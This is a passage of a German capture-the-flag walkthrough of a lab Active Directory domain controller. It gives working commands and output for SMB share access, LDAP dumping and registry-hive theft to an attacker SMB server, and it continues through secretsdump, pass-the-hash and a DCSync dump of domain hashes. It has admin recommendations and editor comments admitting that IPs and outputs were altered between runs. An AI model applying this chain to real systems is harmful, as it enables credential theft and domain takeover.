+            <p class="analysis"><strong>Analyse:</strong> Mit den `zximena448`-Credentials werden nun die SMB-Shares aufgelistet. Im Gegensatz zum anonymen Versuch ist dies nun erfolgreich. Der Benutzer hat Lesezugriff auf `ADMIN$`, `IPC$`, `NETLOGON`, `SYSVOL` und sogar Lese-/Schreibzugriff auf `C$`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf `C$` mit Lese- und Schreibrechten ist ein signifikanter Schritt. Dies bestätigt die hohen Privilegien des `zximena448`-Kontos (wahrscheinlich durch die Mitgliedschaft in `Backup Operators`).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den `C$`-Share mounten oder mit `smbclient` verbinden, um das Dateisystem zu durchsuchen, nach sensiblen Daten oder dem User-Flag zu suchen und potenziell die Registry Hives (SAM, SYSTEM, SECURITY) zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Die Berechtigungen auf Admin-Shares wie `C$` und `ADMIN$` streng kontrollieren. Die Notwendigkeit der Mitgliedschaft in `Backup Operators` für diesen Benutzer überprüfen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">smbclient '\\\\192.168.2.117\\C$' -U SUPEDECDE.LCAL/zximena448%internet</span></div>
+                    <pre>
+Try "help" to get a list of possible commands.
+smb: \> ls
+  $WinREAgent                        DH        0  Sat Jun 15 21:19:51 2024
+  Documents and Settings          DHSrn        0  Sun Jun 16 04:51:08 2024
+  DumpStack.log.tmp                 AHS    12288  Sat Aug 10 08:21:08 2024
+  pagefile.sys                      AHS 1476395008  Sat Aug 10 08:21:08 2024
+  PerfLogs                            D        0  Sat May  8 10:15:05 2021
+  Program Files                      DR        0  Sat Jun 15 19:54:31 2024
+  Program Files (x86)                 D        0  Sat May  8 11:34:13 2021
+  ProgramData                       DHn        0  Sun Jun 16 04:51:08 2024
+  Recovery                         DHSn        0  Sun Jun 16 04:51:08 2024
+  System Volume Information         DHS        0  Sat Jun 15 21:02:21 2024
+  <span class="command">Users</span>                              DR        0  Mon Jun 17 20:31:08 2024
+  Windows                             D        0  Sat Jun 15 21:21:10 2024
+
+		12942591 blocks of size 4096. 10812947 blocks available
+
+smb: \> cd Users\zximena448\Desktop\
+smb: \Users\zximena448\Desktop\> ls
+  .                                  DR        0  Mon Jun 17 20:31:24 2024
+  ..                                  D        0  Mon Jun 17 20:30:22 2024
+  desktop.ini                       AHS      282  Mon Jun 17 20:30:22 2024
+  <span class="command">user.txt</span>                            A       33  Wed Jun 12 22:01:30 2024
+
+		12942591 blocks of size 4096. 10812871 blocks available
+
+smb: \Users\zximena448\Desktop\> get user.txt
+<span class="password">getting file \Users\zximena448\Desktop\user.txt of size 33 as user.txt (4,0 KiloBytes/sec) (average 4,0 KiloBytes/sec)</span>
+
+smb: \> cd Users\Administrator\
+smb: \Users\Administrator\> ls
+<span class="password">NT_STATUS_ACCESS_DENIED listing \Users\Administrator\</span>
+
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mit `smbclient` wird eine Verbindung zum `C$`-Share des Ziels unter Verwendung der `zximena448`-Credentials hergestellt. Das Stammverzeichnis wird aufgelistet. Anschließend wird in das Desktop-Verzeichnis des Benutzers `zximena448` navigiert (`cd Users\zximena448\Desktop\`), wo die Datei `user.txt` gefunden wird. Diese wird erfolgreich heruntergeladen (`get user.txt`). Der Versuch, in das Verzeichnis des Administrators zu wechseln, scheitert mit `NT_STATUS_ACCESS_DENIED`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde gefunden und heruntergeladen. Obwohl der Benutzer hohe Rechte hat (Zugriff auf C$), reichen diese nicht aus, um direkt auf das Administrator-Profil zuzugreifen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Inhalt der heruntergeladenen `user.txt` anzeigen. Die Privilegien des `zximena448`-Kontos nutzen, um möglicherweise die Registry Hives zu extrahieren oder andere Methoden zur Eskalation zum Domain Admin zu finden.<br><strong>Empfehlung (Admin):</strong> NTFS-Berechtigungen auch innerhalb von Admin-Shares überprüfen, um das Prinzip der geringsten Rechte anzuwenden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat user.txt</span></div>
+                    <pre>
+<span class="password">2fe79eb0e02ecd4dd2833cfcbbdb504c</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `user.txt` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der User-Flag wurde erfolgreich extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag dokumentieren. Fokus auf die Eskalation zum Domain Admin legen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bezüglich des Flags erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ldapdomaindump -u SUPEDECDE.local\\zximena448 -p internet 192.168.2.117</span></div>
+                    <pre>
+[] Connecting to host...
+[] Binding to host
+<span class="password">[+] Bind OK</span>
+[] Starting domain dump
+<span class="password">[+] Domain dump finished</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `ldapdomaindump` wird verwendet, um mithilfe der `zximena448`-Credentials Informationen über die Active Directory-Domäne über LDAP zu sammeln. Das Tool stellt erfolgreich eine Verbindung her und schließt den Dump ab. Es erstellt mehrere Dateien mit Informationen über Benutzer, Gruppen, Computer, Richtlinien etc.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies liefert eine Fülle von Informationen über die AD-Struktur, die für weitere Angriffe nützlich sein können, auch wenn wir bereits privilegierte Zugangsdaten haben. Es kann helfen, Beziehungen zwischen Objekten, Gruppenmitgliedschaften und Konfigurationen zu verstehen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die generierten Dump-Dateien (insbesondere `domain_users.json`, `domain_groups.json`) analysieren, um ein besseres Verständnis der Domäne zu erhalten und potenzielle weitere Angriffsziele oder Fehlkonfigurationen zu identifizieren.<br><strong>Empfehlung (Admin):</strong> Den LDAP-Zugriff überwachen. Sicherstellen, dass Benutzer nur die Informationen abfragen können, die sie benötigen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mkdir dom</span></div>
+                    <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mv domain_* dom</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cd dom</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 4128
+-rw-r--r-- 1 root root   29016  9. Aug 23:56 <span class="command">domain_computers_by_os.html</span>
+-rw-r--r-- 1 root root   12399  9. Aug 23:56 <span class="command">domain_computers.grep</span>
+-rw-r--r-- 1 root root   28694  9. Aug 23:56 <span class="command">domain_computers.html</span>
+-rw-r--r-- 1 root root  212790  9. Aug 23:56 <span class="command">domain_computers.json</span>
+-rw-r--r-- 1 root root   10182  9. Aug 23:56 <span class="command">domain_groups.grep</span>
+-rw-r--r-- 1 root root   17142  9. Aug 23:56 <span class="command">domain_groups.html</span>
+-rw-r--r-- 1 root root   79554  9. Aug 23:56 <span class="command">domain_groups.json</span>
+-rw-r--r-- 1 root root     247  9. Aug 23:56 <span class="command">domain_policy.grep</span>
+-rw-r--r-- 1 root root    1143  9. Aug 23:56 <span class="command">domain_policy.html</span>
+-rw-r--r-- 1 root root    5255  9. Aug 23:56 <span class="command">domain_policy.json</span>
+-rw-r--r-- 1 root root      71  9. Aug 23:56 <span class="command">domain_trusts.grep</span>
+-rw-r--r-- 1 root root     828  9. Aug 23:56 <span class="command">domain_trusts.html</span>
+-rw-r--r-- 1 root root       2  9. Aug 23:56 <span class="command">domain_trusts.json</span>
+-rw-r--r-- 1 root root  336005  9. Aug 23:56 <span class="command">domain_users_by_group.html</span>
+-rw-r--r-- 1 root root  226805  9. Aug 23:56 <span class="command">domain_users.grep</span>
+-rw-r--r-- 1 root root  471611  9. Aug 23:56 <span class="command">domain_users.html</span>
+-rw-r--r-- 1 root root 2742431  9. Aug 23:56 <span class="command">domain_users.json</span>
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom]
+└─# <span class="command">cat domain_users.json</span></div>
+                     <pre>
+[{
+    "attributes": {
+        "accountExpires": [
+            "9999-12-31 23:59:59.999999+00:00"
+        ],
+        "badPasswordTime": [
+            "1601-01-01 00:00:00+00:00"
+        ],
+        "badPwdCount": [
+            0
+        ],
+        "cn": [
+            "Paula Felix"
+        ],
+        "codePage": [
+            0
+        ],
+        "company": [
+            "CompanyB"
+        ],
+        "countryCode": [
+            0
+        ],
+        "dSCorePropagationData": [
+            "1601-01-01 00:00:00+00:00"
+        ],
+        "department": [
+            "Engineering"
+        ],
+        "description": [
+            "Avid traveler and photography enthusiast"
+...
+...
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die durch `ldapdomaindump` erzeugten Dateien werden in ein neues Verzeichnis `dom` verschoben und aufgelistet. Ein Ausschnitt der `domain_users.json` wird angezeigt, um die Art der gesammelten Informationen zu demonstrieren (Benutzerattribute wie Name, Abteilung, Beschreibung etc.).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies dient der Organisation und zeigt die Detailtiefe der LDAP-Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Dump-Dateien systematisch nach Hinweisen für die Privilegieneskalation durchsuchen (z.B. interessante Gruppenmitgliedschaften, Beschreibungen mit Passworthinweisen, verwaiste Konten).<br><strong>Empfehlung (Admin):</strong> Überprüfen, welche Attribute über LDAP auslesbar sind und ob dies eingeschränkt werden sollte.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der nächste Schritt zielt darauf ab, die SAM-, SYSTEM- und SECURITY-Registry-Hives vom Domain Controller zu extrahieren. Da der Benutzer `zximena448` Mitglied der `Backup Operators` ist und Lese-/Schreibzugriff auf `C$` hat, ist es wahrscheinlich, dass er auch die notwendigen Rechte hat, um auf die Registry zuzugreifen oder die RemoteRegistry-Dienst zu nutzen. Um die Hives zu empfangen, wird auf der Angreifer-Maschine ein SMB-Server gestartet.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">locate smbserver.py</span></div>
+                    <pre>
+/usr/lib/python3/dist-packages/impacket/smbserver.py
+/usr/lib/python3/dist-packages/scapy/layers/smbserver.py
+/usr/share/doc/python3-impacket/examples/smbserver.py
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">cp /usr/share/doc/python3-impacket/examples/smbserver.py .</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Anmerkung: Der Prompt wechselt hier zu [~/dom/share], was logisch ist -->
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 smbserver.py share . -smb2support</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[] Config file parsed
+[] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[] Config file parsed
+[] Config file parsed
+[] Config file parsed
+[] Config file parsed
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Impacket-Skript `smbserver.py` wird lokalisiert, in das aktuelle Verzeichnis kopiert und ausgeführt. Es startet einen SMB-Server auf der Angreifer-Maschine, der das aktuelle Verzeichnis (`.`) unter dem Share-Namen `share` freigibt. Die Option `-smb2support` aktiviert SMBv2/3-Unterstützung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SMB-Server auf der Angreifer-Maschine ist nun bereit, Dateien zu empfangen, die vom Zielsystem dorthin geschrieben werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diesen SMB-Server im Hintergrund laufen lassen, während die Registry Hives vom Zielsystem extrahiert werden.<br><strong>Empfehlung (Admin):</strong> Ausgehende SMB-Verbindungen vom DC zu unbekannten Hosts im Netzwerk blockieren.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">locate reg.py</span></div>
+                    <pre>
+/usr/lib/python3.11/copyreg.py
+/usr/lib/python3.11/xml/dom/domreg.py
+/usr/lib/python3.12/copyreg.py
+/usr/lib/python3.12/xml/dom/domreg.py
+/usr/local/lib/python3.11/dist-packages/future/moves/copyreg.py
+/usr/local/lib/python3.11/dist-packages/future/moves/winreg.py
+/usr/share/creddump7/framework/win32/rawreg.py
+/usr/share/doc/python3-impacket/examples/reg.py
+/usr/share/ghidra/Ghidra/Features/Python/data/jython-2.7.3/Lib/copy_reg.py
+/usr/share/ghidra/Ghidra/Features/Python/data/jython-2.7.3/Lib/xml/dom/domreg.py
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">cp /usr/share/doc/python3-impacket/examples/reg.py .</span></div>
+                      <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Zeige die Versuche und die erfolgreichen Ausgaben gemäß Originaltext -->
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SAM' -o '\\\\192.168.2.199\\share'</span></div>
+                     <!-- Keine direkte Ausgabe für den ersten Versuch im Original, aber Fehler beim zweiten -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SYSTEM' -o '\\\\192.168.2.199\\share'</span></div>
+                    <!-- Keine direkte Ausgabe für den ersten Versuch im Original -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SECURITY' -o '\\\\192.168.2.199\\share'</span></div>
+                    <!-- Keine direkte Ausgabe für den ersten Versuch im Original -->
+                 </div>
+            </div>
+            <!-- Zeige die späteren Ausgaben, die Erfolg und Fehler dokumentieren -->
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SAM' -o '\\\\192.168.2.199\\share'</span></div>
+                    <pre>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+<span class="password">[] Saved HKLM\SAM to \\192.168.2.199\share\SAM.save</span>
+                    </pre>
+                 </div>
+            </div>
+            <!-- Hinweis: Im Original ist der Prompt hier anders und die IP im Output ist 192.168.0.51. Ich folge dem Original, kommentiere aber die Inkonsistenz -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">garffff@garffff:~/hackmyvm/dc02/ldapdomaindump$ <span class="command">reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SYSTEM' -o '\\\\192.168.2.199\\share'</span></div>
+                    <pre>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+<span class="password">[] Saved HKLM\SYSTEM to \\192.168.0.51\share\SYSTEM.save</span> <!-- IP-Inkonsistenz im Originaltext -->
+                    </pre>
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">garffff@garffff:~/hackmyvm/dc02/ldapdomaindump$ <span class="command">reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SECURITY' -o '\\\\192.168.2.199\\share'</span></div>
+                    <pre>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[!] Cannot check RemoteRegistry status. Hoping it is started...
+<span class="password">[] Saved HKLM\SECURITY to \\192.168.0.51\share\SECURITY.save</span> <!-- IP-Inkonsistenz im Originaltext -->
+                    </pre>
+                 </div>
+            </div>
+            <!-- Zeige den Fehler bei erneutem Versuch mit anderem Pfad -->
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 reg.py SUPEDECDE.local/zximena448:internet@192.168.2.117 save -keyName 'HKLM\SAM' -o '\\\\192.168.2.199\\dom\\share'</span></div>
+                    <pre>
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
+<span class="password">[-] Couldn't save HKLM\SAM: RRPSessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found</span>
+                    </pre>
+                 </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das Impacket-Skript `reg.py` wird lokalisiert, kopiert und verwendet, um eine Verbindung zum Remote-Registry-Dienst des Ziels herzustellen. Mit den `zximena448`-Credentials werden die SAM-, SYSTEM- und SECURITY-Hives aus `HKEY_LOCAL_MACHINE` (HKLM) extrahiert und auf dem SMB-Share der Angreifer-Maschine (`\\\\192.168.2.199\\share`) gespeichert. Die Ausgaben zeigen, dass der Status des RemoteRegistry-Dienstes nicht geprüft werden kann, das Skript aber trotzdem versucht fortzufahren. Die Hives werden scheinbar erfolgreich gespeichert (trotz der inkonsistenten IP 192.168.0.51 in einigen Ausgaben des Originaltextes). Ein späterer Versuch mit einem anderen Zielpfad (`dom\\share`) scheitert mit `ERROR_BAD_NETPATH`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das erfolgreiche Extrahieren der Registry Hives ist ein entscheidender Schritt zur Offline-Analyse und zum Dumpen von Anmeldeinformationen (lokale Hashes, LSA Secrets, potenziell zwischengespeicherte Domain-Credentials).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gespeicherten Hives (`SAM.save`, `SYSTEM.save`, `SECURITY.save`) mit einem Tool wie `secretsdump.py` im lokalen Modus analysieren, um Hashes und andere Geheimnisse zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Den Zugriff auf die Registry über das Netzwerk einschränken (RemoteRegistry-Dienst deaktivieren oder Firewall-Regeln anpassen). Die Berechtigungen der `Backup Operators` überprüfen (insbesondere SeBackupPrivilege), da diese oft das Auslesen der Hives ermöglichen.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">ls -lash</span></div>
+                    <pre>
+insgesamt 48K + 11M <!-- Korrektur: Größe von SYSTEM.save hinzugefügt -->
+4.0K drwxrwxr-x 2 garffff garffff 4.0K Jul 28 13:57 .
+4.0K drwxrwxr-x 5 garffff garffff 4.0K Jul 28 13:42 ..
+ 36K -rwxr-xr-x 1 root   root    28K Jul 28 13:56 <span class="command">SAM.save</span>
+ 40K -rwxr-xr-x 1 root   root    32K Jul 28 13:57 <span class="command">SECURITY.save</span>
+ 11M -rwxr-xr-x 1 root   root    11M Jul 28 13:57 <span class="command">SYSTEM.save</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ls -lash` im Verzeichnis `~/dom/share` auf der Angreifer-Maschine bestätigt, dass die drei Registry Hives (SAM, SECURITY, SYSTEM) erfolgreich gespeichert wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Erfolg der vorherigen Extraktionsschritte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der Offline-Analyse der Hives fortfahren.<br><strong>Empfehlung (Admin):</strong> Keine zusätzlichen Maßnahmen erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">cp /usr/share/doc/python3-impacket/examples/secretsdump.py .</span></div>
+                      <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 secretsdump.py -sam SAM.save -security SECURITY.save -system SYSTEM.save LOCAL</span></div> <!-- Korrektur: LOCAL statt LCAL -->
+                    <pre>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
+[] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+<span class="password">Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634</span>:::
+<span class="password">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
+<span class="password">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[] Dumping cached domain logon information (domain/username:hash)
+[] Dumping LSA Secrets
+<span class="password">[] $MACHINE.ACC</span>
+<span class="password">$MACHINE.ACC:plain_password_hex:0185...[SNIP]...c93b4</span>
+<span class="password">$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:f5ce239a47e93e2a4f4e8ca4bf431012</span>:::
+<span class="password">[] DPAPI_SYSTEM</span>
+<span class="password">dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4</span>
+<span class="password">dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503</span>
+<span class="password">[] NL$KM</span>
+ 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
+ [SNIP]
+ 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
+<span class="password">NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991</span>
+[] Cleaning up...
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Impacket-Skript `secretsdump.py` wird kopiert und im lokalen Modus ausgeführt, um die extrahierten Hives zu analysieren. Es extrahiert erfolgreich:
+                <ul>
+                    <li>Lokale SAM-Hashes: NTLM-Hashes für Administrator, Guest, DefaultAccount.</li>
+                    <li>LSA Secrets: Darunter den Klartext (`plain_password_hex`) und den NTLM-Hash (`f5ce...`) des Maschinenkontos (`$MACHINE.ACC`, was DC01 entspricht) sowie DPAPI-Schlüssel und den `NL$KM`-Schlüssel.</li>
+                </ul>
+            </p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein weiterer kritischer Fund. Die NTLM-Hashes des lokalen Administrators (`209c...`) und insbesondere des Maschinenkontos (`f5ce...`) sind äußerst wertvoll. Der Hash des Maschinenkontos kann oft für Privilegieneskalation im Active Directory verwendet werden (z.B. für DCSync).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen, sich mit den extrahierten Hashes per Pass-the-Hash anzumelden. Priorität hat der Hash des Maschinenkontos (`dc01$`), da dieser wahrscheinlich höhere Domänenprivilegien hat als der lokale Administrator-Hash des DC.<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass LSA Protection (RunAsPPL) aktiviert ist, um das Auslesen von LSA Secrets zu erschweren. Lokale Administrator-Passwörter sollten komplex sein und idealerweise über LAPS verwaltet werden. Maschinenkonto-Passwörter regelmäßig rotieren lassen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.117 -u administrator -H 209c6174da490caeb422f3fa5a7ae634</span></div>
+                    <pre>
+SMB         192.168.2.117   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False)
+SMB         192.168.2.117   445    DC01             [-] <span class="password">SUPEDECDE.LCAL\administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE</span>
+                    </pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit `nxc` über SMB mittels Pass-the-Hash anzumelden. Verwendet wird der extrahierte NTLM-Hash (`-H 209c...`) für das Konto `administrator`. Der Versuch scheitert mit `STATUS_LOGON_FAILURE`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der lokale Administrator-Hash funktioniert nicht für die Domänenanmeldung (oder das Konto ist deaktiviert/der Hash ist veraltet). Dies ist nicht ungewöhnlich, da der lokale Administrator eines DC oft nicht für Domänenanmeldungen verwendet wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hash des Maschinenkontos versuchen.<br><strong>Empfehlung (Admin):</strong> Keine spezifischen Maßnahmen erforderlich, da der Angriff fehlschlug.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Hinweis: IP im Originaltext ist 192.168.0.54, vermutlich ein Tippfehler, sollte 192.168.2.117 sein. Ich korrigiere es hier für die Logik. -->
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nxc smb 192.168.2.117 -u 'dc01$' -H f5ce239a47e93e2a4f4e8ca4bf431012</span></div>
+                    <pre>
+SMB         192.168.2.117   445    DC01             [] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SUPEDECDE.LCAL) (signing:True) (SMBv1:False) <!-- Korrigierte IP -->
+SMB         192.168.2.117   445    DC01             <span class="password">[+] SUPEDECDE.LCAL\dc01$:f5ce239a47e93e2a4f4e8ca4bf431012</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nun wird versucht, sich mit dem NTLM-Hash des Maschinenkontos (`dc01$`) anzumelden (`-u 'dc01$' -H f5ce...`). Dieser Versuch ist erfolgreich!</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Exzellent! Der Zugriff als Maschinenkonto `dc01$` wurde mittels Pass-the-Hash erlangt. Maschinenkonten auf Domain Controllern haben standardmäßig sehr hohe Privilegien im Active Directory, oft ausreichend für Replikationsvorgänge (DCSync).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die erlangten Privilegien des Maschinenkontos nutzen, um einen DCSync-Angriff durchzuführen und die Hashes aller Domänenbenutzer (insbesondere Domain Admins und krbtgt) zu extrahieren.<br><strong>Empfehlung (Admin):</strong> Maschinenkonto-Passwörter regelmäßig und automatisch rotieren lassen. Den Zugriff und die Aktionen von Maschinenkonten überwachen.</p>
+
+            <p class="analysis"><strong>Proof of Concept: Domain Compromise via DCSync</strong><br>
+            Der folgende Schritt demonstriert die vollständige Kompromittierung der Active Directory-Domäne. Durch die Kompromittierung des Maschinenkonto-Hashes (`dc01$`) erlangen wir die notwendigen Berechtigungen (Directory Replication Services), um einen DCSync-Angriff durchzuführen. Dabei imitieren wir einen Domain Controller und fordern vom Ziel-DC die Passwort-Hashes aller Domänenbenutzer an.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/dom/share]
+└─# <span class="command">python3 secretsdump.py 'SUPEDECDE.LCAL/dc01$@192.168.2.117' -hashes :f5ce239a47e93e2a4f4e8ca4bf431012</span></div>
+                    <pre>
+[-] Remoteoperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[] Using the DRSUAPI method to get NTDS.DIT secrets
+<span class="password">Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd</span>:::
+<span class="password">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>:::
+<span class="password">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0</span>:::
+<span class="password">soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15</span>:::
+<span class="password">soupedecode.local\otara1:1104:aad3b435b51404eeaad3b435b51404ee:ee98f16e3d56881411fbd2a67a5494c6</span>:::
+<span class="password">soupedecode.local\kleo2:1105:aad3b435b51404eeaad3b435b51404ee:bda63615bc51724865a0cd0b4fd9ec14</span>:::
+<span class="password">soupedecode.local\eyara3:1106:aad3b435b51404eeaad3b435b51404ee:68e34c259878fd6a31c85cbea32ac671</span>:::
